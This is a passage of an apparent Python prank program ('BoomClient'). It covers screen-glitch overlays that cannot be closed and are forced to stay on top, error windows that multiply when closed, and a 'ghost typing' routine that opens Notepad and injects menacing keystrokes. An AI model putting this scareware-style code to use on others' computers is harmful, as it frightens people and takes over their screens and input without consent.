        canvases = []
        for mx, my, mw, mh in monitors:
            glitch = self.create_monitor_window(mx, my, mw, mh, "black")
            glitch.attributes('-alpha', 0.4)
            glitch.protocol("WM_DELETE_WINDOW", lambda: None)
            canvas = tk.Canvas(glitch, width=mw, height=mh, bg="black", highlightthickness=0)
            canvas.pack(fill=tk.BOTH, expand=True)
            canvases.append(canvas)
            glitch_windows.append(glitch)
            def keep_top(w=glitch):
                try:
                    w.attributes('-topmost', True)
                    w.lift()
                    w.after(100, keep_top)
                except tk.TclError:
                    pass
            keep_top()
            self.windows.append(glitch)
        
        def do_glitch():
            if self.stop_flag or self.stage != 8: return
            for c in canvases:
                try:
                    c.delete("all")
                    for _ in range(30):
                        x1 = random.randint(0, self.screen_width)
                        y1 = random.randint(0, self.screen_height)
                        x2 = x1 + random.randint(50, 500)
                        y2 = y1 + random.randint(5, 50)
                        color = random.choice(["#ff0000", "#00ff00", "#0000ff", "#ffffff", "#000000"])
                        c.create_rectangle(x1, y1, x2, y2, fill=color, outline="")
                except tk.TclError:
                    pass
            offset_x = random.randint(-10, 10)
            offset_y = random.randint(-10, 10)
            for w, (mx, my, mw, mh) in zip(glitch_windows, monitors):
                try:
                    w.geometry(f"{mw}x{mh}+{mx+offset_x}+{my+offset_y}")
                except tk.TclError:
                    pass
            if glitch_windows:
                try:
                    glitch_windows[0].after(random.randint(50, 200), do_glitch)
                except tk.TclError:
                    pass
        
        do_glitch()

    def prank_infinite_window(self):
        self.close_all_windows()
        self.stage = 7
        self.root.after(0, self.update_debug, f"Stage: Extra\nInfinite Window Spawn")
        
        def spawn_window(x=None, y=None):
            if self.stop_flag or self.stage != 7: return
            win = tk.Toplevel(self.root)
            win.title("Error - Unclosable")
            w, h = 300, 150
            if x is None: x = random.randint(50, self.screen_width - w - 50)
            if y is None: y = random.randint(50, self.screen_height - h - 50)
            win.geometry(f"{w}x{h}+{x}+{y}")
            win.attributes('-topmost', True)
            
            tk.Label(win, text="You shouldn't have done that...", font=("Arial", 12, "bold"), fg="red").pack(expand=True)
            
            def on_close():
                try: win.destroy()
                except: pass
                if not self.stop_flag and self.stage == 7:
                    spawn_window(random.randint(50, self.screen_width - w - 50), random.randint(50, self.screen_height - h - 50))
                    spawn_window(random.randint(50, self.screen_width - w - 50), random.randint(50, self.screen_height - h - 50))
            
            win.protocol("WM_DELETE_WINDOW", on_close)
            self.windows.append(win)
            
        spawn_window()

    def prank_ghost_typing(self):
        self.root.after(0, self.update_debug, f"Stage: Extra\nGhost Typing")
        if not KEYBOARD_AVAILABLE:
            print("keyboard module not installed, skipping ghost typing")
            return
            
        def type_ghost():
            if self.stop_flag: return
            if os.name == 'nt':
                os.system("start notepad.exe")
            time.sleep(1)
            text = "I know what you are doing... Look behind you."
            for char in text:
                if self.stop_flag: break
                keyboard.write(char)
                time.sleep(random.uniform(0.05, 0.3))
                
        threading.Thread(target=type_ghost, daemon=True).start()


if __name__ == "__main__":
    app = BoomClient()
